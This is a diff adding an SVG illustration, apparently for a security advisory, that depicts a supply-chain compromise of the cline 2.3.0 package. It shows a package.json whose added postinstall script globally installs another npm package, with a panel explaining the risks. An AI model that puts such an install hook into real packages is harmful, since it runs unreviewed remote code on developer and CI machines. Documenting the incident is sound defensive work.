@@ -1,0 +1,34 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1120" height="600" viewBox="0 0 1120 600" role="img" aria-labelledby="title desc">
+  <title id="title">Cline package.json postinstall diff</title>
+  <desc id="desc">An illustrative package.json diff showing the unauthorized postinstall script added in cline 2.3.0.</desc>
+  <style>
+    .bg{fill:#fbfcfe}
+    .card{fill:#fff;stroke:#2f3b52;stroke-width:2;rx:12}
+    .head{fill:#2f3b52}
+    .headText{fill:#fff;font:700 20px Arial,sans-serif}
+    .code{fill:#1b2838;font:17px "Courier New",monospace}
+    .add{fill:#1f7a3d;font:700 17px "Courier New",monospace}
+    .warn{fill:#fff0ed;stroke:#bf3c2f;stroke-width:2;rx:10}
+    .note{fill:#7d261d;font:700 18px Arial,sans-serif}
+  </style>
+  <rect class="bg" width="1120" height="600"/>
+  <rect class="card" x="58" y="58" width="660" height="430"/>
+  <rect class="head" x="58" y="58" width="660" height="48"/>
+  <text class="headText" x="84" y="89">package.json modification</text>
+  <text class="code" x="84" y="142">{</text>
+  <text class="code" x="108" y="178">"name": "cline",</text>
+  <text class="code" x="108" y="214">"version": "2.3.0",</text>
+  <text class="code" x="108" y="250">"bin": { "cline": "dist/cli.mjs" },</text>
+  <text class="code" x="108" y="286">"scripts": {</text>
+  <text class="add" x="132" y="322">+ "postinstall": "npm install -g openclaw@latest"</text>
+  <text class="code" x="108" y="358">}</text>
+  <text class="code" x="84" y="394">}</text>
+
+  <rect class="warn" x="770" y="116" width="300" height="300"/>
+  <text class="note" x="798" y="160">Why it matters</text>
+  <text class="code" x="798" y="204">Runs during install</text>
+  <text class="code" x="798" y="240">Affects developer hosts</text>
+  <text class="code" x="798" y="276">Affects CI images</text>
+  <text class="code" x="798" y="312">Bypasses code review</text>
+  <text class="code" x="798" y="348">Signals publish compromise</text>
+</svg>
